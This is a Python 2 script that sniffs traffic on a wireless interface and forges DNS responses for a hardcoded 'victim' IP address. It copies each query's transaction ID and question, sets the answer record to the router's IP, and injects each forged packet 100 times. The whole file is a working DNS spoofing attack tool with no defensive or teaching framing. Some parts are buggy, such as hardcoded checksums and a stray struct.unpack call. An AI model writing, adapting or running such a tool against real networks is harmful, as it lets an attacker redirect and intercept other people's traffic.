import struct

from PacketInjector import PacketInjector
from PacketSniffer import PacketSniffer
import binascii


def checksum(msg):
    s = 0

    # loop taking 2 characters at a time
    for i in range(0, len(msg), 2):
        w = ord(msg[i]) + (ord(msg[i + 1]) << 8)
        s = s + w

    s = (s >> 16) + (s & 0xffff)
    s = s + (s >> 16)

    # complement and mask to 4 byte short
    s = ~s & 0xffff

    return s

victim_ip = '192.168.0.110'
routto_ip = '192.168.0.1'

packet_snf = PacketSniffer('wlp2s0')

victim_ip_parts = victim_ip.split('.')
victim_ip = ''
for victim_ip_part in victim_ip_parts:
    hex_part = hex(int(victim_ip_part)).split('x')[1]
    if len(hex_part) == 1:
        hex_part = '0' + hex_part

    victim_ip += hex_part

n = binascii.unhexlify(victim_ip)
print struct.unpack("bbbb", victim_ip)



routto_ip_parts = routto_ip.split('.')
routto_ip = ''
for routto_ip_part in routto_ip_parts:
    hex_part = hex(int(routto_ip_part)).split('x')[1]
    if len(hex_part) == 1:
        hex_part = '0' + hex_part

    routto_ip += hex_part


while True:
    packet_snf.get_tcp_package()

    new_resp_packet = ''
    #udp packet
    if packet_snf.tcp_packet_hex[46:48] == '11':
        query_mac = packet_snf.tcp_packet_hex[0:12]
        dest_mac = packet_snf.tcp_packet_hex[12:24]
        query_ip = packet_snf.tcp_packet_hex[52:60]
        router_ip = packet_snf.tcp_packet_hex[60:68]
        src_port = packet_snf.tcp_packet_hex[68:72]
        dest_port = packet_snf.tcp_packet_hex[72:76]

        if query_ip == victim_ip:
            query_mac = packet_snf.tcp_packet_hex[0:12]
            dest_mac = packet_snf.tcp_packet_hex[12:24]

            new_resp_packet += dest_mac
            new_resp_packet += query_mac
            new_resp_packet += packet_snf.tcp_packet_hex[24:28]
            new_resp_packet += '45'
            new_resp_packet += '40'

            ## total length
            dec_len = (len(packet_snf.tcp_packet_hex)-28)/2 + 16
            hex_len = '00' + hex(dec_len).split('x')[1]
            new_resp_packet += hex_len
            ##

            new_resp_packet += '0000'
            new_resp_packet += '4000'
            new_resp_packet += '3b'
            new_resp_packet += '11'
            new_resp_packet += 'bda2' #ip protocol check sum

            new_resp_packet += router_ip
            new_resp_packet += query_ip
            new_resp_packet += dest_port
            new_resp_packet += src_port

            dec_len = dec_len - 20
            hex_len = '00' + hex(dec_len).split('x')[1]
            new_resp_packet += hex_len

            new_resp_packet += 'd7fb' #user datagram check sum

            ## domain name system part

            #trasaction ID
            new_resp_packet += packet_snf.tcp_packet_hex[84:88]
            new_resp_packet += '8180'
            new_resp_packet += '0001'
            new_resp_packet += '0001'
            new_resp_packet += '0000'
            new_resp_packet += '0000'

            new_resp_packet += packet_snf.tcp_packet_hex[108:len(packet_snf.tcp_packet_hex)]

            ##answer part
            new_resp_packet += 'c00c00010001000000090004'
            new_resp_packet += router_ip

            packet_inj = PacketInjector('wlp2s0')
            for i in range(100):
                try:
                    packet_inj.send_raw_hex(new_resp_packet)
                except TypeError:
                    pass